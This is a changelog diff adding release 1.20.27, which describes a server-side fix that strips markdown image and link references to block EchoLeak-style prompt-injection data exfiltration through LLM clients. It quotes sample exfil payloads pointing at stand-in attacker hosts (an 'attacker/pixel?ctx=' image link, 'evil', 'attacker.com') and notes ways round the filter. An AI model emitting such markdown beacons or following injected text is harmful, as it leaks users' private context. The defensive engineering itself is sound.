@@ -10,7 +10,35 @@ been run, it is marked **pending** rather than asserted.
 
 ---
 
-full historical record.
+## [1.20.27] — 2026-08-14
+
+### Server — "Cordon" (EchoLeak markdown exfil neutralized at the read seam)
+
+Server `Cargo.toml`/lock 1.20.26 → 1.20.27; plugin unchanged. One pure function,
+one composition point. No new endpoints, no new fields. See
+`IMPLEMENTATION_PLAN_v1.20.27_Cordon.md`. **ATLAS F-2 (High).**
+
+- **`gate::strip_markdown_refs`** neutralizes the EchoLeak / CVE-2025-32711
+class at the source. `sanitize_read` previously stripped invisible Unicode only;
+  `![alt](http://attacker/pixel?ctx=...)` and `[t](https://evil)` rode verbatim
+  through the seam into MCP/HTTP clients and onward to a markdown-rendering LLM
+  consumer. The new forward-scan (regex-free, `char_indices` + the
+  `mask_phone`-style byte walk) rewrites `![label](url)` → `[label]` and
+  `[text](url)` → `text`. **Bare URLs in prose are intentionally left intact**
+  (`see example.com` is not rewritten — false-positive trap). Composed into
+  `sanitize_read` in the order redact → markdown → invisible-Unicode (strip
+  markdown BEFORE invisible so a bidi-wrapped `]` can't defeat the bracket scan
+  after invisible stripping). `sanitize_read_opt` inherits it via delegation.
+  Storage stays verbatim (render-only, the `strip_invisible` storage rule).
+  `+3 tests`.
+
+**Honest ceilings:** deterministic text transform, NOT a markdown parser or URL
+  reputation service; a non-markdown exfil vector ("visit attacker.com") survives
+  (model-discipline / host-contract territory). The MCP binary inherits the strip
+  transitively (its `tool_result_payload`/`format_response` compose through
+  server handlers using `sanitize_read`). **Validation:** 44 gate tests pass,
+  clippy + fmt clean.
+
 ## [1.20.26] — 2026-08-14
 
 ### Server — "Tourniquet" (SSRF egress paths closed)
